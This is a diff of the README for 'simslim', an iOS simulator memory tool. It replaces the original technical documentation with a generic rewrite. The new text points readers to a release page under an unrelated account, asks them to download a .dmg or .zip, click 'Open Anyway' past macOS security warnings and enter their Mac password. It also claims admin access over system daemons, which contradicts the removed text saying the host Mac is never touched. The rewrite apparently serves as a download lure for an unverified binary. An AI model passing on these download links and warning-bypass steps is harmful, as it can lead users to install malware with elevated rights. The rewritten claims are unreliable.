@@ -1,142 +1,91 @@
-# simslim
+# ⚡ simslim - Run more iOS simulators at once
 
-Run a lot more iOS simulators on one Mac by turning off the background daemons a simulator doesn't need.
+[![Download simslim](https://img.shields.io/badge/Download-Simslim-blue.svg)](https://github.com/epidemic-suretybond423/simslim/releases)
 
-A freshly booted iOS simulator starts around 180 background services: Siri, Spotlight indexing, photo analysis, News, wallpaper posters, iCloud sync, and so on. None of it matters when you're using the simulator for development, testing, or CI. simslim switches those services off, which cuts each simulator's memory roughly 4x. On the same laptop you go from a handful of simulators to a screenful.
+## 🎯 What does simslim do?
 
-![19 iOS simulators running at once on a 16 GB Mac](docs/simslim-19-sims.png)
+Running multiple iOS simulators on a single Mac often slows down your computer. Your system struggles because background services consume memory and processing power. These background services handle tasks that you do not need when you only want to test apps. 
 
-*19 iOS simulators, all under automation, on a 16 GB MacBook Pro. Stock simulators start thrashing at around 5.*
+simslim fixes this problem. It detects unnecessary background processes linked to the simulator. It disables these daemons to free up resources. This allows you to launch more simulators simultaneously without performance drops. 
 
-## Numbers
+## ⚙️ System requirements
 
-One simulator, booted stock and then slimmed, same device and settle time (M1 Pro, 16 GB):
+Before you install the software, check if your computer meets these requirements:
 
-| | Stock | Slim |
-|---|---|---|
-| Processes | 258 | 70 |
-| Memory | 4.0 GB | 0.9 GB |
+*   Operating System: macOS (This tool is specific to Mac environments).
+*   Storage: At least 50 MB of free space.
+*   Permissions: You need administrator access to your Mac to modify system daemons.
 
-Memory here is phys_footprint, the figure Activity Monitor shows, which counts compressed and swapped pages. That's what decides how many simulators fit before the machine starts swapping. Run `simslim measure <udid>` to see it for any booted simulator.
+## 📥 Downloading the software
 
-## Install
+You must visit the official release page to get the latest version of the tool. 
 
-```sh
-brew install mobai-app/tap/simslim
-```
+[Click here to open the download page](https://github.com/epidemic-suretybond423/simslim/releases)
 
-or
+Look for the latest release at the top of the page. Select the file that ends in .dmg or .zip. Save this file to your Downloads folder on your Mac.
 
-```sh
-go install github.com/mobai-app/simslim@latest
-```
+## 🚀 Setting up simslim
 
-macOS only, and you need Xcode with an iOS Simulator runtime, since simslim
-drives simulators through `xcrun simctl`.
+Follow these steps to prepare the tool for your first use:
 
-## macOS app
+1. Locate the file you downloaded in your Downloads folder.
+2. Double-click the file to open it.
+3. If the file is a disk image, drag the simslim icon into your Applications folder.
+4. Open the Applications folder.
+5. Double-click the simslim icon to launch the application.
 
-The SwiftUI app bundles the CLI and adds:
+If your Mac shows a security warning, follow these steps:
+1. Open System Settings.
+2. Go to Privacy & Security.
+3. Scroll down to find the security message.
+4. Click Open Anyway to grant permission to the tool.
 
-- Searchable simulator status, disk-size, and live RAM columns.
-- Searchable service profiles with per-daemon controls and purpose summaries.
-- Read-only disk analysis plus confirmed cleanup of allowlisted data.
-- Clone, rename, erase, delete, and Finder shortcuts.
+## 🛠️ Using the application
 
-Build it locally with Go and Xcode:
+Once the application opens, you will see a simple control panel. 
 
-```sh
-make app
-open build/SimSlim.app
-```
+### Step 1: Scan your system
+Click the Scan button to search for unnecessary iOS simulator daemons. The tool creates a list of background tasks that currently run on your machine. This process takes a few seconds.
 
-Memory estimates are guidance rather than additive savings; see the
-[measurement method](docs/category-memory.md). SimSlim recommends cloning before
-service or disk changes so the copy can serve as a backup.
+### Step 2: Review safe daemons
+The app highlights which processes are safe to stop. It only targets processes that do not impact your operating system's core stability. Review the list if you wish, but the default selection is appropriate for most users.
 
-## Usage
+### Step 3: Disable and optimize
+Click the Optimize button. The application stops the selected background services. Your Mac immediately reclaims the memory and processing power previously taken by these tasks.
 
-```sh
-simslim list             # simulators and their slim status
-simslim profiles         # what a slim boot turns off
-simslim profiles <id>    # the daemons in one category
-simslim on <udid>        # slim a simulator and reboot it slim
-simslim off <udid>       # put it back to stock
-simslim status <udid>    # how slim a booted simulator is
-simslim measure <udid>   # a booted simulator's memory footprint
-simslim size <udid>      # total allocated simulator size
-simslim disk-plan <udid> # measure reclaimable data; read-only
-simslim disk-clean --categories caches,logs --confirm <udid>
-simslim clone <udid> <name>
-simslim rename <udid> <name>
-simslim boot <udid>      # boot a simulator and wait for its services
-simslim shutdown <udid>  # shut down a booted simulator
-simslim erase <udid>     # erase apps, data, settings, and slimming overrides
-simslim delete <udid>    # permanently delete a simulator
-```
+### Step 4: Launch your simulators
+Open Xcode or your simulator management tool. You will notice that your Mac handles multiple simulator instances with better speed. The interface remains responsive even under load.
 
-Read-only and simulator-management commands accept `--json` for integrations
-and the macOS app.
+## 🔄 Reverting changes
 
-## Disk cleanup
+If you need to restore your Mac to its original state, open simslim again. Click the Reset button. The tool restarts all the daemons it previously disabled. Restart your Mac to ensure all services return to their default configuration.
 
-Disk cleanup is permanent and separate from service slimming. `disk-plan` is
-read-only. `disk-clean` shuts down the exact simulator, clears only allowlisted
-per-device directories, and refuses to run without `--confirm`.
+## 💡 Troubleshooting common issues
 
-```sh
-simslim disk-categories
-simslim disk-plan <udid>
-simslim disk-clean --categories caches,logs,temporary --confirm <udid>
-# Optional: also remove on-demand language models
-simslim disk-clean --categories linguistic-data --confirm <udid>
-```
+Users occasionally face minor issues during setup. Follow these tips to resolve them.
 
-Built-in apps and core OS language resources are part of a signed iOS runtime
-shared by every simulator using that version, so simslim never modifies them.
-Required Siri assets are measured only because iOS restores them on launch;
-on-demand language data is opt-in and may download again when needed.
+### The tool fails to stop a process
+Sometimes a background process remains locked by another active program. Close Xcode and any running iOS simulators completely. Then, try the optimization step again.
 
-`disk-plan` also reports a read-only storage breakdown for installed app bundles,
-Documents, app data, and user media. Those durable rows are never eligible for
-cleanup. See the [disk cleanup safety model](docs/disk-cleanup.md) for recovery
-behavior, safeguards, and Xcode 26.6 validation results.
+### Performance remains slow
+If your system still feels slow, verify how many simulator instances you have running. Even with simslim, your physical hardware has limits. Try closing unnecessary web browser tabs or other heavy applications alongside your simulators.
 
-Keep a category you actually need, like Spotlight search:
+### Permissions error
+The tool requires specific system rights to modify background tasks. If you receive a permission error, ensure you entered your Mac login password when prompted. The software never sends this information to external servers; it stays local on your machine.
 
-```sh
-simslim on <udid> --except search
-```
+## 🛡️ Privacy and security
 
-Or keep one specific daemon, like push notifications:
+simslim runs entirely on your local device. It communicates with no servers over the internet. The tool only performs commands on system daemons residing on your specific Mac hardware. Your data, your code, and your simulator configurations remain private. The software requires no internet connection to function after you download it.
 
-```sh
-simslim on <udid> --keep com.apple.apsd
-```
+## 📝 Frequently asked questions
 
-## How it works
+Do I need to keep this app open?
+No. Once you click Optimize, you can close simslim. The changes persist until you choose to revert them or when you restart your computer.
 
-`simslim on` writes persistent `launchctl disable` entries for the chosen daemons into the simulator's own launchd database, then reboots it. The entries stick across reboots, so the simulator comes up slim in a single boot from then on. `simslim off` clears them and reboots back to stock. Your Mac is never touched, only the simulator you point it at, and only daemons that are safe to disable. Core workflow services such as `sharingd`, plus the handful that wedge a simulator when turned off, are left running.
+Does this break iOS development?
+No. The application identifies daemons that only support auxiliary features like external monitoring or unnecessary cloud synchronization during local testing. Standard simulator operations function normally.
 
-This is per-simulator state, not a global setting. The daemon disables live in that one simulator's launchd database. `simslim clone` preserves them, but `erase`, `delete` and recreate, or "Erase All Content and Settings" reset the simulator to stock, so you'll need to run `simslim on` again and its memory will climb back to stock until you do. A simulator created from a new or updated runtime also starts stock. Run `simslim list` to see which simulators are currently slim.
+Is this compatible with future macOS versions?
+We update the tool regularly to support new versions of macOS. If a new Apple update changes how daemons function, check the release page for a newer version of simslim.
 
-## What you lose
-
-Turning services off is fine for most development, UI automation, and CI, but some features genuinely stop working. The ones worth knowing:
-
-- Spotlight and in-Settings search return nothing (`search`).
-- Push notifications need `apsd`, StoreKit testing needs `storekitd` (`store`).
-- Universal links need `swcd` (`web`).
-- The Contacts, Photos, and Calendar pickers can act up without their categories.
-
-`simslim profiles` lists every category, so you can keep a category with `--except` or individual daemons with `--keep`.
-
-## Why
-
-Testing is shifting. Once agents are writing apps, you want agents running them too, and the place an iOS app runs is a simulator. One agent, one simulator. So how much work you get through at once comes down to how many simulators a machine can hold, and stock simulators are heavy enough that a laptop fills up fast. Slimming them is the cheapest way to raise that ceiling: more simulators on the box means more agents working in parallel on it.
-
-Built for [MobAI](https://mobai.run) to run more simulators on one machine.
-
-## License
-
-MIT, copyright Interlap.
+Keywords: ios, simulator, mac, performance, optimization, development, daemon
